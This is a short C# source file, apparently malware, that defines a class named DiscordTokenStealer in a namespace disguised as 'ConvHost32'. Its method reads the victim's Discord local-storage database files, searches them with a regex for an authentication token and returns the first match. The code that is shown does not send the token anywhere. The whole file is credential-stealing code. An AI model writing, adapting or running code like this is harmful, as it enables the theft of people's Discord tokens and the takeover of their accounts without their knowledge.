
using System;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;

namespace ConvHost32
{
    public class DiscordTokenStealer
    {
        public static void print(string d)
        {
            Console.WriteLine(d);
        }
        public static string TokenSteal()
        {
            string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            print(Appdata);
            string path = Appdata + @"\discord\Local Storage\leveldb";

            string[] dbfiles = Directory.GetFiles(path, "*.ldb", SearchOption.AllDirectories);
            
            Regex regex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
            if (Directory.Exists(path))
            {
                foreach (var file in dbfiles)
                {
                    FileInfo info = new FileInfo(file);
                    string contents = File.ReadAllText(info.FullName);
                    Match match = regex.Match(contents);
                    if (match.Success)
                    {
                        return match.Value;
                    }
                }
            }
            return string.Empty;
        }
    }
}
